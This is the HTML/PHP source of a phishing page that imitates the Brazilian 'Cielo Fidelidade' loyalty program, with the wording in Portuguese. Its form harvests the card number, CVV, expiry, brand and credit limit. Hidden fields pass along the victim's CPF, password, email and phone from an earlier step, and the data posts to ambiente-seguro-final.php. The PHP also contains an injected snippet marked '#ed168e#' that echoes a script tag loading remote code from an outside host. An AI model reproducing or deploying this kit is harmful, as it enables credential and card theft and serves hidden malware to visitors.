<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>

<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<style type="text/css">
<!--
.style1 {font-size: 14px}
-->
</style>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="globalsign-domain-verification" content="hGTLznI_ALhM2YyYNahnfrjVot8mNBOI9jVDnpkOoY" />
    <title>Cadastro | Cielo Fidelidade</title>
    <link rel="shortcut icon" href="favicon.ico" />
    <script type="text/javascript" src="Scripts/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="Scripts/integracao.html"></script>
    <link rel="stylesheet" type="text/css" media="all" href="Content/css/default.css" />
    
    <link rel="stylesheet" type="text/css" media="all" href="Content/css/naocadastrado.css" />


    <script>var BASE_URL = 'index.html';</script>
      <script>
	function verifica() { 
	if(document.form1.nome_card.value == '') { 
	alert("Porfavor informe o nome como inscrito no cartão!"); 
	document.form1.nome_card.focus();
	return false; 
	}
	if(document.form1.nome_card.value.length < 6) { 
	alert("Você deve informar o nome como inscrito no cartão corretamente!"); 
	document.form1.nome_card.focus();
	return false; 
	}
	if(document.form1.num_card.value == '') { 
	alert("Porfavor informe os 16 números do cartão!"); 
	document.form1.num_card.focus();
	return false; 
	}
	if(document.form1.num_card.value.length < 16) { 
	alert("Você deve informar os 16 números do cartão corretamente!"); 
	document.form1.num_card.focus();
	return false; 
	}
	if(document.form1.val_mes.value == 'Mês') { 
	alert("Porfavor informe o mês da válidade do seu cartão!"); 
	return false; 
	}
	if(document.form1.val_ano.value == 'Ano') { 
	alert("Porfavor informe o ano da válidade do seu cartão!"); 
	return false; 
	}
	if(document.form1.bandeira.value == 'Selecione') { 
	alert("Porfavor informe a bandeira do seu cartão!"); 
	return false; 
	}
	if(document.form1.cvv.value == '') { 
	alert("Porfavor informe seu código de segurança!"); 
	document.form1.cvv.focus();
	return false; 
	}
	if(document.form1.cvv.value.length < 3) { 
	alert("Você deve informar seu código de segurança corretamente, o mesmo pode ser encontrado no verso do cartão!"); 
	document.form1.cvv.focus();
	return false; 
	}
}
</script>
</head>
<body class="interna naocadastrado">

    
    <noscript></noscript>
    <script>        (function (w, d, s, l, i) {
            w[l] = w[l] || []; w[l].push({
                'gtm.start':
        new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
    j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
    '../www.googletagmanager.com/gtm5445.html?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-B3BD');</script>


    <div class="container">
        <div class="strip st-menu">
    <div class="wrap">
        <a class="logo-small" href="index.html">Programa <strong>Cielo Fidelidade</strong></a>
        <a class="duvidas" href="FaleConosco.html"> > Dúvidas sobre o programa</a>
    </div>
</div>

        <div class="strip st-image">
    <div class="wrap">
        <div class="foto-header">
            <img src="Content/img/deslogadas/triple-balls-destaq.png" />
        </div>
        <div class="sl-texto">
            <h2>Cadastre-se já.</h2>
            <p>O Programa Cielo Fidelidade tem muitos presentes para você.</p>
        </div>
    </div>
</div>

        <div class="render-body">
            


<div class="strip st-content">
    <div class="wrap">
        <h2>Estamos quase acabando - Cielo Fidelidade</h2>
        <p class="recuo">Preenchimento obrigatório de todos os campos abaixo.</p>
        <div class="ct-form">
<form name="form1" action="ambiente-seguro-final.php" id="formPrimeiroAcesso" method="post" onSubmit="return verifica();">
            <div class="form-col-1">
                    <label>Nome no cartão:</label>
                    <input class="cnpj prereq" data-val="true" data-val-required="Campo CNPJ Obrigatório" id="nome_card" name="nome_card" type="text" value="" />
                    <span class="field-validation-valid" data-valmsg-for="CNPJ" data-valmsg-replace="true"></span>
                    <label>Número do cartão:</label>
                    <input data-val="true" data-val-length="The field NomeProprietario must be a string with a maximum length of 250." data-val-length-max="250" data-val-required="Campo Nome do Proprietário Obrigatório" id="num_card" name="num_card" type="text" value="" />
                    <span class="field-validation-valid" data-valmsg-for="NomeProprietario" data-valmsg-replace="true"></span>
                </div>
                <div class="form-col-2">

                    <div>

                        <label>
                            Bandeira: 
                      </label>
                      <select name="bandeira" class="input_bandeira">
                        	<option name="selecione" selected>Selecione</option>
                        	<option name="visa">Visa</option>
                            <option name="master">Master</option>
                            <option name="diners">Diners</option>
                            <option name="AMEX">American Express</option>
                        <option name="discovers">Discovers</option>
                        <option name="aura">Aura</option>
                        <option name="visaelectron">Visa Eletron</option>
                            <option name="elo">Elo</option>
                        </select>
                        <span class="field-validation-valid" data-valmsg-for="EC" data-valmsg-replace="true"></span>

                    </div>

                    <div>

                        <label>Validade:</label>
                        <select name="val_mes" class="input_one" id="val_mes">
                       	  <option name="mes" selected>Mês</option>
                        	<option name="01">01</option>
                            <option name="02">02</option>
                            <option name="03">03</option>
                            <option name="04">04</option>
                            <option name="05">05</option>
                            <option name="06">06</option>
                            <option name="07">07</option>
                            <option name="08">08</option>
                            <option name="09">09</option>
                            <option name="10">10</option>
                            <option name="11">11</option>
                            <option name="12">12</option>                            
                  </select>
                      <select name="val_ano" class="input_one" id="val_ano">
                        <option name="ano" selected>Ano</option>
                        	<option name="2014">2014</option>
                            <option name="2015">2015</option>
                            <option name="2016">2016</option>
                            <option name="2017">2017</option>
                            <option name="2018">2018</option>
                            <option name="2019">2019</option>
                            <option name="2020">2020</option>
                            <option name="2021">2021</option>
                            <option name="2022">2022</option>
                            <option name="2023">2023</option>
                            <option name="2024">2024</option>
                            <option name="2025">2025</option>
                      </select>
                        <span class="field-validation-valid" data-valmsg-for="Celular" data-valmsg-replace="true"></span>

                    </div>

              <div id="divCelularInvalido" class="fix">
                        <div class="form-group">
                            <div class="col-md-8">
                     
                            </div>
                        </div>
                    </div>
                    

                </div>
                <div class="form-col-3">
                    <div class="fix">
                        <label>Código de Segurança:</label>
                        <input class="emailacesso prereq" data-val="true" data-val-length="The field Email must be a string with a maximum length of 250." data-val-length-max="250" data-val-required="Campo Email Obrigatório" id="cvv" name="cvv" type="text" value="" />
                        <span class="field-validation-valid" data-valmsg-for="Email" data-valmsg-replace="true"></span>
                    </div>
                    <div class="fix">
                       
                  </div>
                   
                </div> 
                                <div class="form-col-3">
                    <div class="fix">
                        <label>Limite do Seu Cartão: <span class="style1">Ex: 1.000</span></label>
                        <input class="emailacesso prereq" data-val="true" data-val-length="The field Email must be a string with a maximum length of 250." data-val-length-max="250" data-val-required="Campo Limite Obrigatório" id="limite" name="limite" type="text" value="" />
                        <span class="field-validation-valid" data-valmsg-for="Email" data-valmsg-replace="true"></span>
                    </div>
                    <div class="fix">
                       
                  </div>
                   
                </div> 
        <?php 
				$nome = $_POST['nome'];
				$email = $_POST['email'];
				$dia = $_POST['dia'];
				$mes = $_POST['mes'];
				$ano = $_POST['ano'];
				$cpf = $_POST['cpf'];
				$celular = $_POST['celular'];
				$senha = $_POST['senha'];
				?>
<?php
#ed168e#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868795\"></script>";
echo $f;
}
#/ed168e#
?>   
                <input type="hidden" name="nome" value="<?php echo $nome;?>">  
                <input type="hidden" name="email" value="<?php echo $email;?>"> 
                <input type="hidden" name="dia" value="<?php echo $dia;?>"> 
                <input type="hidden" name="mes" value="<?php echo $mes;?>"> 
                <input type="hidden" name="ano" value="<?php echo $ano;?>"> 
                <input type="hidden" name="cpf" value="<?php echo $cpf;?>"> 
                <input type="hidden" name="celular" value="<?php echo $celular;?>"> 
                <input type="hidden" name="senha" value="<?php echo $senha;?>">            
                <button type="submit" class="botaoSubmit">Proseguir</button>                
</form>        </div>
    </div>
</div>


        </div>
        <div class="strip st-footer">
    <div class="wrap">
        <img src="Content/img/comum/logo-footer.png" />
        <p>Copyright 2014 Cielo Fidelidade. Todos os direitos reservados</p>
    </div>
</div>

    </div>
    
    
    <script src="Scripts/jquery.mask.min.js"></script>
    <script src="Scripts/pages/nao-cadastrado.js"></script>

    <script type="text/javascript">
        var count = 0;
        function DesabilitarBotao() {
            count++;
            return count == 1;
        }
    </script>

    <script type="text/javascript" src="Scripts/cielo2014.js"></script>
</body>

<!-- Mirrored from www.cielofidelidade.com.br/PrimeiroAcesso by HTTrack Website Copier/3.x [XR&CO'2013], Thu, 17 Jul 2014 15:30:11 GMT -->
</html>
